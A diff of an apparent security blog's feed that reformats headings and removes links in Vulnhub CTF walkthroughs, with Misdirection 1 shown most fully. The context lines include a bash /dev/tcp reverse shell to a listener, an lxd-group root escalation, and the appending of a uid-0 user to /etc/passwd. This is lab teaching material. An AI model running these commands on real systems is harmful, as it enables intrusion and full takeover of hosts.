@@ -5,7 +5,6 @@
 &lt;th>Difficulty&lt;/th>
 &lt;th>Release Date&lt;/th>
 &lt;th>Author&lt;/th>
-&lt;th>Machine link&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
@@ -13,15 +12,14 @@
 &lt;td>Beginner&lt;/td>
 &lt;td>24 Sep 2019&lt;/td>
 &lt;td>FalconSpy&lt;/td>
-&lt;td>&lt;a href="https://vulnhub.com/entry/misdirection-1,371/">https://vulnhub.com/entry/misdirection-1,371/&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
 &lt;/table>
-&lt;h1 id="summary">Summary&lt;/h1>
+&lt;h2 id="summary">Summary&lt;/h2>
 &lt;p>For this box, initial access was a web shell discovered. Then with low priv shell we could run bash as brexit user
 and were able to pivot to that account. Once we are brexit user, we abuse his membership to the lxd to start a
 privileged container that can read and write the whole file system by mounting it in the container.&lt;/p>
-&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
+&lt;h2 id="reconnaissance">Reconnaissance&lt;/h2>
 &lt;p>Nmap&lt;/p>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.136
 Host is up &lt;span style="color:#f92672">(&lt;/span>0.00032s latency&lt;span style="color:#f92672">)&lt;/span>.
@@ -31,8 +29,8 @@ PORT STATE SERVICE VERSION
 80/tcp open http Rocket httpd 1.2.6 &lt;span style="color:#f92672">(&lt;/span>Python 2.7.15rc1&lt;span style="color:#f92672">)&lt;/span>
 3306/tcp open mysql MySQL &lt;span style="color:#f92672">(&lt;/span>unauthorized&lt;span style="color:#f92672">)&lt;/span>
 8080/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
-&lt;h2 id="8080-http">8080 (HTTP)&lt;/h2>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;h3 id="8080-http">8080 (HTTP)&lt;/h3>
 &lt;p>Nmap&lt;/p>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e"># Nmap 7.91 scan initiated Wed Apr 14 06:31:44 2021 as: nmap -n -Pn -sV -p 8080 --script default,http-enum,http-shellshock,http-backup-finder,http-config-backup --append-output -oN recon-misdirection1/misdirection1-8080-httpnmap.enum 192.168.191.136&lt;/span>
 Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.136
@@ -69,7 +67,7 @@ server-status &lt;span style="color:#f92672">[&lt;/span>Status: 403, Size: 305, 
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>After some directory bruteforcing on both port 80 and 8080 I discovered several directories. On port 8080 the debug directory
 contains a web shell.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-1.png" class="center" style="border-radius: 8px;" />
-&lt;h1 id="shell-as-www-data">Shell as www-data&lt;/h1>
+&lt;h2 id="shell-as-www-data">Shell as www-data&lt;/h2>
 &lt;p>Supplying the following command we are able to get a reverse shell.&lt;/p>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">bash -c &lt;span style="color:#e6db74">&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.191.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>shell:&lt;/p>
@@ -77,13 +75,13 @@ contains a web shell.&lt;/p>
 &lt;p>After some basic enumeration we discover www-data has sudo permissions to run /bin/bash as brexit user without
 any password requirement.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-3.png" class="center" style="border-radius: 8px;" />
-&lt;h1 id="shell-as-brexit">Shell as brexit&lt;/h1>
+&lt;h2 id="shell-as-brexit">Shell as brexit&lt;/h2>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo -u brexit /bin/bash
 &lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-4.png" class="center" style="border-radius: 8px;" />
 &lt;p>On running id we see that brexit is in the lxd group and no images are present.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-10.png" class="center" style="border-radius: 8px;" />
-&lt;h1 id="shell-as-root">Shell as root&lt;/h1>
+&lt;h2 id="shell-as-root">Shell as root&lt;/h2>
 &lt;p>Brexit being in the lxd group allows for privilege escalation. First we need to add am image then create a container.&lt;/p>
 &lt;p>First we need to get distrobuilder, the compile it. This uses go to compile therefore you need go to be installed.&lt;/p>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wget https://github.com/lxc/distrobuilder/archive/refs/tags/distrobuilder-1.2.zip
@@ -119,7 +117,7 @@ lxc exec privesc /bin/sh
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-8.png" class="center" style="border-radius: 8px;" />
 &lt;p>To get shell as root I added a public key to authorized_keys of the root user and can ssh in as root.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-9.png" class="center" style="border-radius: 8px;" />
-&lt;h1 id="extras">Extras&lt;/h1>
+&lt;h2 id="extras">Extras&lt;/h2>
 &lt;p>After looking at other writeups, there was another easy privesc that I didn&amp;rsquo;t explore.&lt;/p>
 &lt;ul>
 &lt;li>Writeable /etc/passwd file&lt;/li>
@@ -131,7 +129,7 @@ lxc exec privesc /bin/sh
 echo &lt;span style="color:#e6db74">&amp;#39;user:$1$user$nY3qj2koDQU1.5HG4ZTj9/:0:0:User:/root:/bin/bash&amp;#39;&lt;/span> &amp;gt;&amp;gt;/etc/passwd
 &lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-12.png" class="center" style="border-radius: 8px;" />
-&lt;h1 id="references">References&lt;/h1>
+&lt;h2 id="references">References&lt;/h2>
 &lt;p>&lt;a href="https://rioasmara.com/2021/01/29/privilege-escalation-with-lxd/">https://rioasmara.com/2021/01/29/privilege-escalation-with-lxd/&lt;/a>&lt;/p>
 &lt;p>&lt;a href="https://www.hackingarticles.in/lxd-privilege-escalation/">https://www.hackingarticles.in/lxd-privilege-escalation/&lt;/a>&lt;/p>
 &lt;p>&lt;a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-etc-passwd">https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-etc-passwd&lt;/a>&lt;/p></content></item><item><title>Vulnhub: Lemon Squeezy 1</title><link>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</link><pubDate>Tue, 13 Apr 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon.png" class="center" style="border-radius: 8px;" />
@@ -141,7 +139,6 @@ echo &lt;span style="color:#e6db74">&amp;#39;user:$1$user$nY3qj2koDQU1.5HG4ZTj9/
 &lt;th>Difficulty&lt;/th>
 &lt;th>Release Date&lt;/th>
 &lt;th>Author&lt;/th>
-&lt;th>Machine link&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
@@ -149,7 +146,6 @@ echo &lt;span style="color:#e6db74">&amp;#39;user:$1$user$nY3qj2koDQU1.5HG4ZTj9/
 &lt;td>Beginner&lt;/td>
 &lt;td>26 Apr 2020&lt;/td>
 &lt;td>James Hay&lt;/td>
-&lt;td>&lt;a href="https://vulnhub.com/entry/lemonsqueezy-1,473/">https://vulnhub.com/entry/lemonsqueezy-1,473/&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
 &lt;/table>
@@ -232,7 +228,6 @@ chmod u+s /suidbash
 &lt;th>Difficulty&lt;/th>
 &lt;th>Release Date&lt;/th>
 &lt;th>Author&lt;/th>
-&lt;th>Machine link&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
@@ -240,7 +235,6 @@ chmod u+s /suidbash
 &lt;td>Intermediate&lt;/td>
 &lt;td>29 Jul 2020&lt;/td>
 &lt;td>v1n1v131r4&lt;/td>
-&lt;td>&lt;a href="https://vulnhub.com/entry/healthcare-1,522/">https://vulnhub.com/entry/healthcare-1,522/&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
 &lt;/table>
@@ -446,7 +440,6 @@ listener.&lt;/p>
 &lt;th>Difficulty&lt;/th>
 &lt;th>Release Date&lt;/th>
 &lt;th>Author&lt;/th>
-&lt;th>Machine link&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
@@ -454,7 +447,6 @@ listener.&lt;/p>
 &lt;td>Beginner&lt;/td>
 &lt;td>2 Nov 2019&lt;/td>
 &lt;td>Ic0de&lt;/td>
-&lt;td>&lt;a href="https://vulnhub.com/entry/evm-1,391/">https://vulnhub.com/entry/evm-1,391/&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
 &lt;/table>
@@ -564,7 +556,6 @@ gcc 45010.c -o pwn
 &lt;th>Difficulty&lt;/th>
 &lt;th>Release Date&lt;/th>
 &lt;th>Author&lt;/th>
-&lt;th>Machine link&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
@@ -572,7 +563,6 @@ gcc 45010.c -o pwn
 &lt;td>Beginner&lt;/td>
 &lt;td>2 Mar 2020&lt;/td>
 &lt;td>Zayotic&lt;/td>
-&lt;td>&lt;a href="https://vulnhub.com/entry/symfonos-52,415/">https://vulnhub.com/entry/symfonos-52,415/&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
 &lt;/table>
@@ -790,7 +780,6 @@ postexploitation we see that the services are running in docker containers.&lt;/
 &lt;th>Difficulty&lt;/th>
 &lt;th>Release Date&lt;/th>
 &lt;th>Author&lt;/th>
-&lt;th>Machine link&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
@@ -798,7 +787,6 @@ postexploitation we see that the services are running in docker containers.&lt;/
 &lt;td>Intermediate&lt;/td>
 &lt;td>20 Aug 2019&lt;/td>
 &lt;td>Zayotic&lt;/td>
-&lt;td>&lt;a href="https://vulnhub.com/entry/symfonos-4,347/">https://vulnhub.com/entry/symfonos-4,347/&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
 &lt;/table>
@@ -941,7 +929,6 @@ what you&amp;rsquo;re writing you&amp;rsquo;ll need to write to another non-exis
 &lt;th>Difficulty&lt;/th>
 &lt;th>Release Date&lt;/th>
 &lt;th>Author&lt;/th>
-&lt;th>Machine link&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
@@ -949,7 +936,6 @@ what you&amp;rsquo;re writing you&amp;rsquo;ll need to write to another non-exis
 &lt;td>Intermediate&lt;/td>
 &lt;td>7 Apr 2020&lt;/td>
 &lt;td>Zayotic&lt;/td>
-&lt;td>&lt;a href="https://vulnhub.com/entry/symfonos-31,332">https://vulnhub.com/entry/symfonos-31,332&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
 &lt;/table>
@@ -1050,7 +1036,6 @@ os&lt;span style="color:#f92672">.&lt;/span>system(&lt;span style="color:#e6db74
 &lt;th>Difficulty&lt;/th>
 &lt;th>Release Date&lt;/th>
 &lt;th>Author&lt;/th>
-&lt;th>Machine link&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
@@ -1058,7 +1043,6 @@ os&lt;span style="color:#f92672">.&lt;/span>system(&lt;span style="color:#e6db74
 &lt;td>Intermediate&lt;/td>
 &lt;td>18 July 2019&lt;/td>
 &lt;td>Zayotic&lt;/td>
-&lt;td>&lt;a href="https://vulnhub.com/entry/symfonos-2,331">https://vulnhub.com/entry/symfonos-2,331&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
 &lt;/table>
@@ -1170,7 +1154,6 @@ rhost and rport where the reverse shell will be received.&lt;/p>
 &lt;th>Difficulty&lt;/th>
 &lt;th>Release Date&lt;/th>
 &lt;th>Author&lt;/th>
-&lt;th>Machine link&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
@@ -1178,7 +1161,6 @@ rhost and rport where the reverse shell will be received.&lt;/p>
 &lt;td>Beginner&lt;/td>
 &lt;td>29 June 2019&lt;/td>
 &lt;td>Zayotic&lt;/td>
-&lt;td>&lt;a href="https://vulnhub.com/entry/symfonos-1,322/">https://vulnhub.com/entry/symfonos-1,322/&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
 &lt;/table>
@@ -2146,7 +2128,7 @@ Twitter , Github , CTFtime , HackTheBox , Hackerone , Medium , Pentesterlab</des
 , &lt;a href="https://hackerone.com/ikuamike" target="_blank" rel="noopener">Hackerone&lt;/a>
 , &lt;a href="https://ikuamike.medium.com/" target="_blank" rel="noopener">Medium&lt;/a>
 , &lt;a href="https://pentesterlab.com/profile/ikuamike" target="_blank" rel="noopener">Pentesterlab&lt;/a>
-&lt;/p></content></item><item><title>All Posts</title><link>https://blog.ikuamike.io/all-posts/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/all-posts/</guid><description>2021 Vulnhub: Misdirection 1 Vulnhub: Lemon Squeezy 1 Vulnhub: Healthcare 1 Vulnhub: EVM 1 Vulnhub: Symfonos 5 Vulnhub: Symfonos 4 Vulnhub: Symfonos 3 Vulnhub: Symfonos 2 Vulnhub: Symfonos 1 2020 Metasploit Community CTF December 2020 WriteUp Grayhat Red Team Village CTF 2020 WriteUp: Tunneler RaziCTF 2020 WriteUp: Chasing a lock CyberSpaceKenya CTF: ZuluMeats3 HTB: Bitlab 2019 HTB: Bastion Vulnhub: DC 2 (Medium) Vulnhub: DC 1 (Medium) Nairobi Tech Week Main CTF 2019 WriteUp (Medium) Nairobi Tech Week CTF Teaser 2019 WriteUp (Medium) ByteBanditsCTF 2019 WriteUp (Medium) HTB: Frolic (Medium) BSidesSF 2019 CTF Writeup (Medium) TAMU CTF 2019 Writeup (Part 2) (Medium) TAMU CTF 2019 Writeup (Part 1) (Medium) HTB: Access (Medium) MitreCTF 2019 Writeup (Medium) Basic Pentesing : 2 WriteUp - Vulnhub (Medium) Basic Pentesing : 1 WriteUp — VulnHub (Medium) 2018 Junior 35C3 CTF Writeup (Medium) Vulnhub: Toppo 1 (Medium) Vulnhub: JIS-CTF VulnUpload (Medium)</description><content>&lt;h1 id="2021">2021&lt;/h1>
+&lt;/p></content></item><item><title>All Posts</title><link>https://blog.ikuamike.io/all-posts/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/all-posts/</guid><description>2021 Vulnhub: Misdirection 1 Vulnhub: Lemon Squeezy 1 Vulnhub: Healthcare 1 Vulnhub: EVM 1 Vulnhub: Symfonos 5 Vulnhub: Symfonos 4 Vulnhub: Symfonos 3 Vulnhub: Symfonos 2 Vulnhub: Symfonos 1 2020 Metasploit Community CTF December 2020 WriteUp Grayhat Red Team Village CTF 2020 WriteUp: Tunneler RaziCTF 2020 WriteUp: Chasing a lock CyberSpaceKenya CTF: ZuluMeats3 HTB: Bitlab 2019 HTB: Bastion Vulnhub: DC 2 (Medium) Vulnhub: DC 1 (Medium) Nairobi Tech Week Main CTF 2019 WriteUp (Medium) Nairobi Tech Week CTF Teaser 2019 WriteUp (Medium) ByteBanditsCTF 2019 WriteUp (Medium) HTB: Frolic (Medium) BSidesSF 2019 CTF Writeup (Medium) TAMU CTF 2019 Writeup (Part 2) (Medium) TAMU CTF 2019 Writeup (Part 1) (Medium) HTB: Access (Medium) MitreCTF 2019 Writeup (Medium) Basic Pentesing: 2 WriteUp - Vulnhub (Medium) Basic Pentesing: 1 WriteUp — VulnHub (Medium) 2018 Junior 35C3 CTF Writeup (Medium) Vulnhub: Toppo 1 (Medium) Vulnhub: JIS-CTF VulnUpload (Medium)</description><content>&lt;h1 id="2021">2021&lt;/h1>
 &lt;p>&lt;a href="https://blog.ikuamike.io/posts/2021/misdirection1/" target="_blank" rel="noopener">&lt;strong>Vulnhub: Misdirection 1&lt;/strong>&lt;/a>
 &lt;/p>
 &lt;p>&lt;a href="https://blog.ikuamike.io/posts/2021/lemonsqueezy1/" target="_blank" rel="noopener">&lt;strong>Vulnhub: Lemon Squeezy 1&lt;/strong>&lt;/a>
@@ -2201,9 +2183,9 @@ Twitter , Github , CTFtime , HackTheBox , Hackerone , Medium , Pentesterlab</des
 &lt;/p>
 &lt;p>&lt;a href="https://ikuamike.medium.com/mitrectf-writeup-b0ce9465c38b" target="_blank" rel="noopener">&lt;strong>MitreCTF 2019 Writeup (Medium)&lt;/strong>&lt;/a>
 &lt;/p>
-&lt;p>&lt;a href="https://ikuamike.medium.com/basic-pentesing-2-writeup-vulnhub-vm-f47b5beb3c4d" target="_blank" rel="noopener">&lt;strong>Basic Pentesing : 2 WriteUp - Vulnhub (Medium)&lt;/strong>&lt;/a>
+&lt;p>&lt;a href="https://ikuamike.medium.com/basic-pentesing-2-writeup-vulnhub-vm-f47b5beb3c4d" target="_blank" rel="noopener">&lt;strong>Basic Pentesing: 2 WriteUp - Vulnhub (Medium)&lt;/strong>&lt;/a>
 &lt;/p>
-&lt;p>&lt;a href="https://ikuamike.medium.com/basic-pentesing-1-writeup-vulnhub-vm-5f71988df85" target="_blank" rel="noopener">&lt;strong>Basic Pentesing : 1 WriteUp — VulnHub (Medium)&lt;/strong>&lt;/a>
+&lt;p>&lt;a href="https://ikuamike.medium.com/basic-pentesing-1-writeup-vulnhub-vm-5f71988df85" target="_blank" rel="noopener">&lt;strong>Basic Pentesing: 1 WriteUp — VulnHub (Medium)&lt;/strong>&lt;/a>
 &lt;/p>
 &lt;h1 id="2018">2018&lt;/h1>
 &lt;p>&lt;a href="https://ikuamike.medium.com/junior-35c3-ctf-writeup-d76edd74fbc6" target="_blank" rel="noopener">&lt;strong>Junior 35C3 CTF Writeup (Medium)&lt;/strong>&lt;/a>
